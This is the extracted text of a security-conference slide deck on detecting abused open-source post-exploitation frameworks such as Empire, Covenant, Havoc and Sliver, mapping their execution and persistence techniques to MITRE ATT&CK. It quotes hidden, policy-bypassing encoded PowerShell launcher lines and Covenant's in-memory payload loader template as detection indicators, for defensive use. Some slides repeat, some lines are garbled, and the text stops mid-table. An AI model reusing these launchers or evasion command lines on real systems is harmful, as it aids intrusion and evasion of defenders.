{
    "id": "1ca249d7-99be-4a78-bc21-d5ffa115e0ce",
    "created_at": "2024-02-01T02:06:48.38787Z",
    "updated_at": "2025-03-27T02:11:33.581601Z",
    "deleted_at": null,
    "sha1_hash": "47ed28849959714f322ab7b3d74aecc6c2c8ae51",
    "title": "Threat Intelligence of Abused Public Post-Exploitation Frameworks",
    "authors": "",
    "file_creation_date": "2024-01-18T16:16:47Z",
    "file_modification_date": "2024-01-18T16:16:47Z",
    "file_size": 2705289,
    "plain_text": "Masafumi Takeda\n\n\n## Threat Intelligence of Abused Public Post-Exploitation Frameworks\n\nInternet Initiative Japan Inc.\n\nMasafumi Takeda\n\n\n-----\n\n###### • Masafumi Takeda\n – SOC member since 2018 – Experience in building and\n operating SOC infrastructure and EDR e al ation\n\n\n\n###### • Tomoya Furukawa\n – SOC member since 2017 – Experience in SIEM management\n\n\n-----\n\n### • Authors of Post-Exploitation Frameworks have made their\n source code publicly available\n\n#### – Attackers can use them without any financial cost\n\n### • Some Post-Exploitation Frameworks that the attackers used\n are not listed in MITRE ATT&CK database\n • Indicators of some Post-Exploitation Frameworks listed in\n MITRE ATT&CK database have not been analyzed\n\n\n-----\n\n### • Authors of Post-Exploitation Frameworks have made their\n source code publicly available\n\n#### – Attackers can use them without any financial cost\n\n### • Some Post-Exploitation Frameworks that the attackers used\n are not listed in MITRE ATT&CK database\n • Indicators of some Post-Exploitation Frameworks listed in\n MITRE ATT&CK database have not been analyzed\n\n## 1. Investigating frameworks that are not listed\n in MITRE ATT&CK database 2. Analyzing indicators related to MITRE\n ATT&CK h i\n\n\n-----\n\n|Tactics|Description|\n|---|---|\n|Execution|The adversary is trying to run malicious code|\n|Persistence|The adversary is trying to maintain their foothold|\n|Privilege Escalation|The adversary is trying to gain higher-level permissions|\n|Defense Evasion|The adversary is trying to avoid being detected|\n|Credential Access|The adversary is trying to steal account names and passwords|\n|Discovery|The adversary is trying to figure out your environment|\n|Lateral Movement|The adversary is trying to move through your environment|\n|Collection|The adversary is trying to gather data of interest to their goal|\n|Command and Control|The adversary is trying to communicate with compromised systems to control them|\n|Exfiltration|The adversary is trying to steal data|\n\n\n-----\n\n### • Introduction of techniques that many Post-Exploitation\n Frameworks have in common\n\n#### – In this presentation, we will introduce some \"Execution\" and\n \"Persistence\" techniques\n\n### • Indicators based on their source code\n\n#### – They might be recorded in Windows event logs\n\n\n-----\n\n# Surveying Post-Exploitation Tools\n\n\n-----\n\n### • Lists C&C tools\n • Listed 139 tools as of December 2023\n\n#### – Commercial and deleted tools are also listed\n\n\n-----\n\n### • 22% of the tools (31 tools) has been abused\n\n\n##### Not\n\n#### Abused\n\n##### Abused\n 78% 22%\n\n\n-----\n\n### • 22% of the tools (31 tools) has been abused\n • 87% of the abused tools (27 tools) are published on GitHub\n\n###### Not Public\n 13%\n\n##### Not\n\n#### Abused\n\n##### Abused\n 78% 22%\n#### Public\n\n\n##### Not\n\n#### Abused\n\n##### Abused\n 78% 22%\n\n\n-----\n\n### 1. Source code is publicly available 2. Abuse cases has been reported 3. At least five of the “Tactics” in MITRE ATT&CK apply to the\n target\n#### – To exclude tools with limited functionality from the analysis\n\n\n-----\n\n### 1. Source code is publicly available 2. Abuse cases has been reported 3. At least five of the “Tactics” in MITRE ATT&CK apply to the\n target\n#### – To exclude tools with limited functionality from the analysis\n\n Target Frameworks\n\n\n\n#### • AsyncRAT\n • Covenant\n • DcRat\n • Empire\n\n\n\n#### • Havoc\n • Koadic\n • Merlin\n\n\n\n#### • PoshC2\n • Quasar\n • Sliver\n\n\n-----\n\n# Introducing Target Frameworks\n\n\n-----\n\n|on information|Col2|\n|---|---|\n|Framework|Evaluated Version (Release Date)|\n|AsyncRAT|v0.5.8 (10/17/2023)|\n|Covenant|v0.6 (08/18/2020)|\n|DcRat|v1.0.7 (05/06/2021)|\n|Empire|v5.7.3 (10/17/2023)|\n|Havoc|No release version (08/25/2023)|\n|Koadic|No release version (01/03/2022)|\n|Merlin|v2.0 (11/06/2023)|\n|PoshC2|v8.1 (08/01/2022)|\n|Quasar|v1.4.1 (05/13/2023)|\n\n\n###### Sli 1 5 41 (07/12/2023)\n\n\n-----\n\n### • Written in C#, published in 2019\n • Latest version is v0.5.8（published on 10/17/2023）\n • Listed in the MITRE ATT&CK database\n\n– [https://attack.mitre.org/software/S1087/](https://attack.mitre.org/software/S1087/)\n\n### • Features\n\n#### – Based on Quasar – Added defense evasion features such as Process Injection or\n disabling AV\n\n### • Example threat report\n\n#### – OneNote Documents Increasingly Used to Deliver Malware,\n\n[https://www.proofpoint.com/us/blog/threat-insight/onenote-documents-increasingly-used-to-deliver-malware](https://www.proofpoint.com/us/blog/threat-insight/onenote-documents-increasingly-used-to-deliver-malware)\n\n\n-----\n\n### • Written C#, published in 2019\n • Latest version is v0.6（published on 08/18/2020）\n\n#### – Development is stopped since 04/22/2021\n\n### • Not listed in the MITRE ATT&CK database\n • Features\n\n#### – Contains many launcher types – SharpSploit is utilized in many features\n\n### • Example threat report\n\n#### – Operation RestyLink: APT campaign targeting Japanese companies,\n\n[https://jp.security.ntt/tech_blog/102hojk](https://jp.security.ntt/tech_blog/102hojk)\n\n\n-----\n\n### • Written in C#, published in 2021\n • Latest version is v1.0.7 (published on 05/06/2021)\n\n#### – This repository is archived because it was abused\n\n### • Not listed in the MITRE ATT&CK database\n • Features\n\n#### – Based on AsyncRAT – Added some features such as ransom\n\n### • Example threat report\n\n#### – OnlyDcRatFans: Malware Distributed Using Explicit Lures of\n OnlyFans Pages and Other Adult Content,\n\n[https://www.esentire.com/blog/onlydcratfans-malware-distributed-using-explicit-lures-of-onlyfans-pages-and-other-adult-content](https://www.esentire.com/blog/onlydcratfans-malware-distributed-using-explicit-lures-of-onlyfans-pages-and-other-adult-content)\n\n\n-----\n\n### • Written as PowerShell scripts, published in 2019\n\n#### – BC Security develops Empire since 2020 (v3.0)\n\n### • Latest version is v5.8.4 (published on 12/22/2023)\n • Listed in MITRE ATT&CK database\n\n– [https://attack.mitre.org/software/S0363/](https://attack.mitre.org/software/S0363/)\n\n### • Features\n\n#### – A launcher needs to start an agent\n\n###### • Launcher is available in five file types\n#### – May expand its functionality with modules – Built-in Covenant\n\n### • Example threat report\n\n#### – OnlyDcRatFans: Malware Distributed Using Explicit Lures of\n\n\n-----\n\n### • Written in C, published in 2022\n • Not version controlled\n\n#### – Main branch is updated in 2023\n\n### • Not listed in the MITRE ATT&CK database\n • Features\n\n#### – Execution with BOF (Beacon Object File) – Thorough detection evasion – May expand functionality with modules\n\n### • Example threat report\n\n#### – Malware Disguised as Document from Ukraine's Energoatom\n Delivers Havoc Demon Backdoor, https://www.fortinet.com/blog/threat\n\n-----\n\n### • Written in Python, published in 2017\n\n#### – Agent is written in JScript/VBScript\n\n### • The latest version was published in 2021\n\n#### – Its development is still active\n\n### • Listed in the MITRE ATT&CK database\n\n– [https://attack.mitre.org/software/S0250/](https://attack.mitre.org/software/S0250/)\n\n### • Features\n\n#### – Most operations are executed using Windows Script Host – This framework can use SSL and TLS for secure communications\n\n### • Example threat report\n\n#### – The Cyber Attack \"kiya\" Targets the Construction Industry,\n\n\n-----\n\n### • Written in Go, published in 2017\n • Development is still active in 2023\n\n#### – Latest version is v2.1.1（published on 01/05/2024）\n\n### • Not listed in the MITRE ATT&CK database\n • Features\n\n#### – Cross-platform – May expand functionality by using external attack tools as modules\n\n### • Example threat report\n\n#### – MerlinAgent: новий open-source інструмент для здійснення\n кібератак у відношенні державних організацій України (CERT- UA#6995, CERT-UA#7183), https://cert.gov.ua/article/5391805\n\n\n-----\n\n### • Written in Python, published in 2016\n • Latest version is v8.1 (published on 08/01/2022)\n • Listed in MITRE ATT&CK database\n\n– [https://attack.mitre.org/software/S0378/](https://attack.mitre.org/software/S0378/)\n\n### • Features\n\n#### – Multiple agent formats\n\n###### • C++ DLL, Shellcode, DotNet2JS, Executable, Msbuild, CSC, macOS JXA\n Dropper, Python2 Dropper\n • Cross-platform\n\n### • Example threat report\n\n#### – オープンソースのツール「PoshC2」を悪用した新たな標的型攻撃を確認\n (Japanese), https://www lac co jp/lacwatch/people/20190213 001770 html\n\n\n-----\n\n### • Written in C#, published in 2015\n\n#### – xRAT, its predecessor, was published in 2014\n\n### • Latest version is v1.4.1 (published on 05/13/2023)\n • Listed in MITRE ATT&CK database\n\n– [https://attack.mitre.org/software/S0262/](https://attack.mitre.org/software/S0262/)\n\n### • Features\n\n#### – Operation by GUI – General RAT functions\n\n### • Example threat report\n\n#### – OneNote Documents Increasingly Used to Deliver Malware,\n\n[https://www.proofpoint.com/us/blog/threat-insight/onenote-documents-increasingly-used-to-deliver-malware](https://www.proofpoint.com/us/blog/threat-insight/onenote-documents-increasingly-used-to-deliver-malware)\n\n\n-----\n\n### • Written in Go, published in 2019\n • Latest version is v1.5.41（published on 07/12/2023）\n • Listed in the MITRE ATT&CK database\n\n– [https://attack.mitre.org/software/S0633/](https://attack.mitre.org/software/S0633/)\n\n### • Features\n\n#### – Cross-platform – Can use mTLS and DNS as a C&C protocol – May expand functionality with Armory modules\n\n### • Example threat report\n\n#### – Sliver C2 Being Distributed Through Korean Program Development\n Company, https://asec.ahnlab.com/en/55652/\n\n\n-----\n\n|Col1|Execution|Persistence|Privilege Escalation|Defense Evasion|Credential Access|Discovery|Lateral Movement|Collection|Command and Control|Exfiltration|Impact|\n|---|---|---|---|---|---|---|---|---|---|---|---|\n|Quasar||||||||||||\n|Empire||||||||||||\n|Merlin||||||||||||\n|AsyncRAT||||||||||||\n|Sliver||||||||||||\n|Covenant||||||||||||\n|PoshC2||||||||||||\n|DcRat||||||||||||\n|Koadic||||||||||||\n\n\n-----\n\n#### Quasar\n\n|Col1|Execution|Persistence|Privilege Escalation|Defense Evasion|Credential Access|Discovery|Lateral Movement|Collection|Command and Control|Exfiltration|Impact|\n|---|---|---|---|---|---|---|---|---|---|---|---|\n|Quasar||||||||||||\n|Empire||||||||||||\n|Merlin||||||||||||\n|AsyncRAT||||||||||||\n|Sliver||||||||||||\n|Covenant||||||||||||\n|PoshC2||||||||||||\n|DcRat||||||||||||\n|Koadic||||||||||||\n\n\n-----\n\n#### Lateral Movement capability\n\n### • Quasar, AsyncRAT and DcRat have a remote desktop\n capability\n\n#### – This capability is classified as \"Lateral Movement\" on MITRE\n ATT&CK database\n\n### • But their remote desktop capabilities are used against the\n compromised device\n • We classified their remote desktop capabilities as \"Remote\n Access Software\", which is one of \"Command and Control\" techniques\n\n\n-----\n\n# Threat Intelligence\n ~ Execution ~\n\n\n-----\n\n###### Technique Count Frameworks\n\n|Windows Command Shell|10/10|• AsyncRAT • Covenant • DcRat • Empire • Koadic • Havoc • Merlin • PoshC2 • Quasar • Sliver|\n|---|---|---|\n\n\n#### PowerShell 9/10\n\n\n\n###### • AsyncRAT\n • Covenant\n • DcRat\n • Empire\n • Havoc\n • Merlin\n • PoshC2\n • Quasar\n\n\n-----\n\n|Technique|Count|Frameworks|\n|---|---|---|\n|Native API|4/10|• Empire • Havoc • Merlin • Sliver|\n|Command Interpreter|1/10|• Empire|\n|WMI|1/10|• Koadic|\n\n\n-----\n\n###### Technique Count Frameworks\n\n|Windows Command Shell|10/10|• AsyncRAT • Covenant • DcRat • Empire • Koadic • Havoc • Merlin • PoshC2 • Quasar • Sliver|\n|---|---|---|\n\n\n#### PowerShell 9/10\n\n\n\n###### • AsyncRAT\n • Covenant\n • DcRat\n • Empire\n • Havoc\n • Merlin\n • PoshC2\n • Quasar\n\n\n-----\n\n### • Usage\n\n#### – Remote shell\n\n###### • AsyncRAT, DcRat, Quasar, Sliver\n#### – Command execution\n\n###### • Koadic, Havoc, Merlin, Covenant\n#### – Launcher execution\n\n###### • Empire, PoshC2\n\n### • Indicators\n\n#### – Parent process – Command line\n\n\n-----\n\n|Framework|Parent Process|Command Line|\n|---|---|---|\n|AsyncRAT|<AsyncRAT process>|\"cmd\"|\n|DcRat|<DcRat process>|\"cmd\"|\n|Quasar|<Quasar process>|\"cmd\" /K chcp <Code page>|\n|Sliver|<Sliver process>|C:¥Windows¥System32¥cmd.exe|\n\n\n-----\n\n|Framework|Parent Process|Command Line|\n|---|---|---|\n|AsyncRAT|<AsyncRAT process>|\"cmd\"|\n|DcRat|<DcRat process>|\"cmd\"|\n|Quasar|<Quasar process>|\"cmd\" /K chcp <Code page>|\n|Sliver|<Sliver process>|C:¥Windows¥System32¥cmd.exe|\n\n\n-----\n\n|Framework|Parent Process|Command Line|\n|---|---|---|\n|AsyncRAT|<AsyncRAT process>|\"cmd\"|\n|DcRat|<DcRat process>|\"cmd\"|\n|Quasar|<Quasar process>|\"cmd\" /K chcp <Code page>|\n|Sliver|<Sliver process>|C:¥Windows¥System32¥cmd.exe|\n\n\n-----\n\n###### public static void StarShell() {\n ProcessShell = new Process() {\n StartInfo = new ProcessStartInfo(\"cmd\") {\n UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardInput = true, RedirectStandardError = true, WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) } };\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|<AsyncRAT or DcRat process>|\n\n\n###### Command \"cmd\" Line\n\n\n-----\n\n|Framework|Parent Process|Command Line|\n|---|---|---|\n|Havoc|<Havoc process>|/c <command>|\n|Koadic|rundll32.exe|C:¥Windows¥system32¥cmd.exe /q /c chcp <code page> & <command>1> %LocalAppData% ¥Temp¥<uuid>.txt 2>&1\"|\n||regsvr32.exe||\n||wmic.exe||\n\n\n#### Merlin <Merlin process>\n\n\n#### (default) C:¥Windows¥system32¥cmd.exe /c <command line>\n\n\n-----\n\n|Framework|Parent Process|Command Line|\n|---|---|---|\n|Havoc|<Havoc process>|/c <command>|\n|Koadic|rundll32.exe|C:¥Windows¥system32¥cmd.exe /q /c chcp <code page> & <command>1> %LocalAppData% ¥Temp¥<uuid>.txt 2>&1\"|\n||regsvr32.exe||\n||wmic.exe||\n\n\n#### Merlin <Merlin process>\n\n\n#### (default) C:¥Windows¥system32¥cmd.exe /c <command line>\n\n\n-----\n\n###### else if ( InputCommands[ 0 ].compare( \"shell\" ) == 0 ) {\n if ( InputCommands.length() > 1 ) {\n\n\n### Arguments only\n\n\n###### auto Program = QString(\"c:¥¥windows¥¥system32¥¥cmd.exe\"); auto Args = QString( \"/c \" + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;\n\n TaskID = CONSOLE_INFO( \"Tasked demon to execute a shell command\" ); CommandInputList[ TaskID ] = commandline;\n\n SEND( Execute.ProcModule( TaskID, 4, \"0;FALSE;TRUE;\" + Program + \";\" + Args ) ) } }\n\n\n-----\n\n###### case DEMON_COMMAND_PROC_CREATE: PUTS( \"Proc::Create\" ) {\n <…snip…>\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Process Name|cmd.exe|\n\n\n###### Command /c <any command line> Li\n\n\n-----\n\n[https://github.com/HavocFramework/Havoc/blob/main/client/Source/Havoc/Demon/ConsoleInput.cpp#L876-L895](https://github.com/HavocFramework/Havoc/blob/main/client/Source/Havoc/Demon/ConsoleInput.cpp#L876-L895)\n\n\n-----\n\n|Framework|Parent Process|Command Line|\n|---|---|---|\n|Havoc|<Havoc process>|/c <command>|\n|Koadic|rundll32.exe|C:¥Windows¥system32¥cmd.exe /q /c chcp <code page> & <command>1> %LocalAppData% ¥Temp¥<uuid>.txt 2>&1\"|\n||regsvr32.exe||\n||wmic.exe||\n\n\n#### Merlin <Merlin process>\n\n\n#### (default) C:¥Windows¥system32¥cmd.exe /c <command line>\n\n\n-----\n\n### • Koadic has 6 types of stagers\n\n#### – Stagers download a Koadic agent from a C&C server and execute it\n\n### • The agent’s process is one of rundll32.exe, regsvr32.exe or\n wmic.exe\n\n|Stager|Agent Process|\n|---|---|\n|stager/js/mshta|rundll32.exe|\n|stager/js/rundll32_js||\n|stager/js/disk||\n|stager/js/bitsadmin||\n|stager/js/regsvr|regsvr32.exe|\n\n\n-----\n\n[https://github.com/offsecginger/koadic/blob/main/data/stager/js/stdlib.js#L952-L957](https://github.com/offsecginger/koadic/blob/main/data/stager/js/stdlib.js#L952-L957)\n\n\n###### try {\n var readout = ~OUTPUT~; if (readout) {\n var output = Koadic.shell.exec(\"~FCMD~\", \"~FDIRECTORY~¥¥\"+Koadic.uuid()+\".txt\");\n }\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|• rundll32.exe • regsvr32.exe • wmic.exe|\n\n\n###### Command C:¥Windows¥system32¥cmd.exe /q /c chcp <user code> &\n\n\n-----\n\n|Framework|Parent Process|Command Line|\n|---|---|---|\n|Havoc|<Havoc process>|/c <command>|\n|Koadic|rundll32.exe|C:¥Windows¥system32¥cmd.exe /q /c chcp <code page> & <command>1> %LocalAppData% ¥Temp¥<uuid>.txt 2>&1\"|\n||regsvr32.exe||\n||wmic.exe||\n\n\n#### Merlin <Merlin process>\n\n\n#### (default) C:¥Windows¥system32¥cmd.exe /c <command line>\n\n\n-----\n\n|Framework|Parent Process|Command Line|\n|---|---|---|\n|Empire|(default) cmd.exe|(default) powershell.exe -nop -ep bypass -w 1 -enc <base64encoded script>|\n|PoshC2||powershell -exec bypass - Noninteractive -windowstyle hidden - e <base64 encoded script>|\n\n\n-----\n\n|Framework|Parent Process|Command Line|\n|---|---|---|\n|Empire|(default) cmd.exe|(default) powershell.exe -nop -ep bypass -w 1 -enc <base64encoded script>|\n|PoshC2||powershell -exec bypass -Noninteractive -windowstyle hidden -e <base64 encoded script>|\n\n\n-----\n\n[https://github.com/BC-SECURITY/Empire/blob/main/empire/server/stagers/windows/launcher_bat.py#L120-L128](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/stagers/windows/launcher_bat.py#L120-L128)\n\n\n-----\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|cmd.exe|\n\n\n###### Command Li\n\n\n###### (default) powershell.exe -nop -ep bypass -w 1\n <b 64 d d i t>\n\n\n-----\n\n[https://github.com/nettitude/PoshC2/blob/master/poshc2/server/payloads/Payloads.py#L145-L148](https://github.com/nettitude/PoshC2/blob/master/poshc2/server/payloads/Payloads.py#L145-L148)\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|cmd.exe|\n\n\n###### Command powershell -exec bypass -Noninteractive -windowstyle hidden\n\n\n-----\n\n###### Technique Count Frameworks\n\n|Windows Command Shell|10/10|• AsyncRAT • Covenant • DcRat • Empire • Koadic • Havoc • PoshC2 • Quasar • Sliver|\n|---|---|---|\n\n\n#### PowerShell 9/10\n\n\n\n###### • AsyncRAT\n • Covenant\n • DcRat\n • Empire\n • Koadic\n • Havoc\n • PoshC2\n • Quasar\n\n\n-----\n\n### • Usage\n\n#### – Remote shell\n\n###### • Sliver\n#### – Command and script execution\n\n###### • Koadic, Havoc, Merlin, AsyncRAT, DcRat, Quasar\n#### – Launcher execution\n\n###### • Empire, Covenant\n\n### • Indicators\n\n#### – Command line\n\n\n-----\n\n|Framework|Command Line|\n|---|---|\n|Sliver|C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥ powershell.exe\" -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding] ::UTF8\"|\n\n\n-----\n\n### • Sliver can execute PowerShell as a remote shell using the\n \"shell\" command\n\n#### – If PowerShell does not exist, it will execute cmd.exe\n\n### • Warns that it is not a recommended command\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|<any Sliver process>|\n\n\n###### C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" Command\n N E i C d [C l ] O E di [T UTF8E di ]\n\n\n-----\n\n#### indicator matrix\n\n|Framework|Command Line|\n|---|---|\n|AsyncRAT|powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath '\"%TEMP%¥[a-z] {6}.ps1\"'|\n|DcRat||\n|Havoc|-C <any command line>|\n\n\n-----\n\n#### from a C&C Server\n\n|Framework|Command Line|\n|---|---|\n|AsyncRAT|powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath '\"%TEMP%¥[a-z] {6}.ps1\"'|\n|DcRat||\n|Havoc|-C <any command line>|\n\n\n-----\n\n### • AsyncRAT and DcRat can receive and execute files from the\n C&C server using the 'SendFile' feature on the C&C Server\n • When 'To Disk' is selected, the script is written to a file, and it\n will be executed using PowerShell\n\n\n-----\n\n###### string fullPath = Path.Combine(Path.GetTempPath(), Methods.GetRandomString(6) + unpack_msgpack.ForcePathObject(\"Extension\").AsString); <…snip…> If (unpack_msgpack.ForcePathObject(“Extension”).AsString.ToLower().EndsWith(\".ps1\")) {\n Process.Start(new ProcessStartInfo {\n FileName = \"cmd\", Arguments = $\"/c start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath {\"'\" + \"¥\"\" + fullPath + \"¥\"\" + \"'\"} & exit\",\n CreateNoWindow = true, <…snip…> });\n\n\n-----\n\n###### FileName = \"cmd\"%Temp%¥[a-z]{6}.<Extension>, Arguments = $\"/c start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath {\"'\" + \"¥\"\" + fullPath + \"¥\"\" + \"'\"} & exit\",\n CreateNoWindow = true, <…snip…> });\n\n\n-----\n\n###### string fullPath = Path.Combine(Path.GetTempPath(), Methods.GetRandomString(6) + unpack_msgpack.ForcePathObject(\"Extension\").AsString); <…snip…> If (unpack_msgpack.ForcePathObject(“Extension”).AsString.ToLower().EndsWith(\".ps1\")) {\n Process.Start(new ProcessStartInfo {\n FileName = \"cmd\", Arguments = $\"/c start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath {\"'\" + \"¥\"\" + fullPath + \"¥\"\" + \"'\"} & exit\",\n CreateNoWindow = true, <…snip…>cmd.exe /c start /b powershell -ExecutionPolicy Bypass }); -WindowStyle Hidden -NoExit -FilePath <script path> & exit\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|cmd.exe|\n\n\n###### Command Li\n\n\n###### powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath '\"%TEMP%¥[ ] {6} 1\"'\n\n\n-----\n\n#### path\n\n|Framework|Command Line|\n|---|---|\n|AsyncRAT|powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath '\"%TEMP%¥[a-z] {6}.ps1\"'|\n|DcRat||\n|Havoc|-C <any command line>|\n\n\n-----\n\n###### else if ( InputCommands[ 0 ].compare( \"powershell\" ) == 0 ) {\n if ( InputCommands.length() > 1 ) {\n auto Program = QString(\"C:¥¥Windows¥¥System32¥¥WindowsPowerShell¥¥v1.0¥¥powershell.exe\");\n // NOTE: the 'powershell' command does not need to escape quotes auto Args = QString( \"-C \" + JoinAtIndex( commandline.split( \" \" ), 1 ) ).toUtf8().toBase64();\n\n### Args variable only contains arguments.\n\n###### TaskID = CONSOLE_INFO( \"Tasked demon to execute a powershell\n\n### This is the same in its \"shell\" command.\n\n###### command/script\" );\n CommandInputList[ TaskID ] = commandline;\n\n SEND( Execute.ProcModule( TaskID, 4, \"0;FALSE;TRUE;\" + Program + \";\" + Args ) ) }\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Process Name|C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe|\n\n\n###### Command -C <any command line> Line\n\n\n-----\n\n|Framework|Command Line|\n|---|---|\n|Empire|(default) powershell.exe -noP -sta -w 1 -enc <base64encoded script>|\n\n\n#### Covenant\n\n\n#### sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Conv ert]::FromBase64String(‘<base64 encode file’>),[IO.Compression.CompressionMode]::Decompress) );sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv\n\n\n-----\n\n###### Framework Command Line\n\n|Empire|(default) powershell.exe -noP -sta -w 1 -enc <base64encoded script>|\n|---|---|\n\n\n#### Covenant\n\n\n#### sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Conv\n Launcher execution with cmd.exe:\n ert]::FromBase64String(‘<base64 encode\n powershell.exe -nop -ep bypass -w 1\n file’>),[IO.Compression.CompressionMode]::Decompress)\n -enc <base64encoded script>\n );sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o) Value ToArray()) EntryPoint Invoke(0 @( [string[]]@()))|\n\n\n-----\n\n### • Empire has multiple file types for its launcher\n • The launcher runs with the execution options configured in the\n listener\n • When the listener protocol is set to http or http_com, only the\n execution options for 'launcher_bat' are modified\n\n###### Launcher Application\n\n launcher_vbs wscript.exe\n\n launcher_hta mshta.exe\n\n launcher_sct regsvc32.exe\n\n launcher_xml MSBuild.exe\n\n l h l k l\n\n|Launcher|Application|\n|---|---|\n|launcher_vbs|wscript.exe|\n|launcher_hta|mshta.exe|\n|launcher_sct|regsvc32.exe|\n|launcher_xml|MSBuild.exe|\n\n\n-----\n\n[https://github.com/BC-SECURITY/Empire/blob/main/empire/server/stagers/windows/launcher_bat.py#L120-L128](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/stagers/windows/launcher_bat.py#L120-L128)\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Command Line|(default) powershell.exe -noP -sta -w 1 -enc <base64encoded script>|\n\n\n-----\n\n###### Framework Command Line\n\n|Empire|(default) powershell.exe -noP -sta -w 1 -enc <base64encoded script>|\n|---|---|\n\n\n#### Covenant\n\n\n#### sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Conv ert]::FromBase64String(‘<base64 encode file’>),[IO.Compression.CompressionMode]::Decompress) );sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o) Value ToArray()) EntryPoint Invoke(0 @( [string[]]@()))|\n\n\n-----\n\n###### private static readonly string PowerShellLauncherCodeTemplate = @“\n sv o (New-Object IO.MemoryStream); sv d (New-Object IO.Compression.DeflateStream(\n\n [IO.MemoryStream][Convert]::FromBase64String(\n ‘{{GRUNT_IL_BYTE_STRING}}’),\n [IO.Compression.CompressionMode]::Decompress) ); sv b (New-Object Byte[](1024)); sv r (gv d).Value.Read((gv b).Value,0,1024); while((gv r).Value -gt 0){\n (gv o).Value.Write((gv b).Value,0,(gv r).Value); sv r (gv d).Value.Read((gv b).Value,0,1024); }\n [Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint\n\n\n-----\n\n###### private static readonly string PowerShellLauncherCodeTemplate = @“\n\n\n###### (gv o).Value.Write((gv b).Value,0,(gv r).Value);Covenant agent is compressed with sv r (gv d).Value.Read((gv b).Value,0,1024);Deflate algorithm } and encoded in Base64\n [Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint\n\n\n-----\n\n|Item|Value|\n|---|---|\n\n\n###### Script Block\n\n\n###### sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String (‘<base64 encode file’>),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv\n\n\n-----\n\n# Threat Intelligence\n ~ Persistence ~\n\n\n-----\n\n###### Technique Count Frameworks\n\n|Registry Run Key/Startup Folder|9/10|• AsyncRAT • Covenant • DcRat • Empire • Koadic • Merlin • PoshC2 • Quasar • Sliver|\n|---|---|---|\n\n\n###### Scheduled Task/Job 7/10\n\n\n\n###### • AsyncRAT\n • DcRat\n • Empire\n • Koadic\n • PoshC2\n • Quasar\n\n\n-----\n\n|Persistence matrix 2|Col2|Col3|\n|---|---|---|\n|Technique|Count|Frameworks|\n|WMI Event Subscription|4/10|• Covenant • Empire • Koadic • PoshC2|\n|Windows Service|4/10|• Covenant • Havoc • PoshC2 • Sliver|\n|Component Object Model Hijacking|1/10|• Covenant|\n|Image File Execution Options Injection|1/10|• Empire|\n\n\n-----\n\n###### Technique Count Frameworks\n\n|Registry Run Key/Startup Folder|9/10|• AsyncRAT • Covenant • DcRat • Empire • Koadic • Merlin • PoshC2 • Quasar • Sliver|\n|---|---|---|\n\n\n###### Scheduled Task/Job 7/10\n\n\n\n###### • AsyncRAT\n • DcRat\n • Empire\n • Koadic\n • PoshC2\n • Quasar\n\n\n-----\n\n### • All frameworks can add an entry to “HKCU” Registry \"Run\" key\n\n#### – HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run – All frameworks use Windows API for adding an entry to Registry\n Run key\n\n### • Indicators\n\n#### – Registry key – Registry value name – Registry value type – Registry value data\n\n\n-----\n\n|Framework|Registry Key|\n|---|---|\n|AsyncRAT|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|DcRat|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Covenant|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Empire|• HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run • 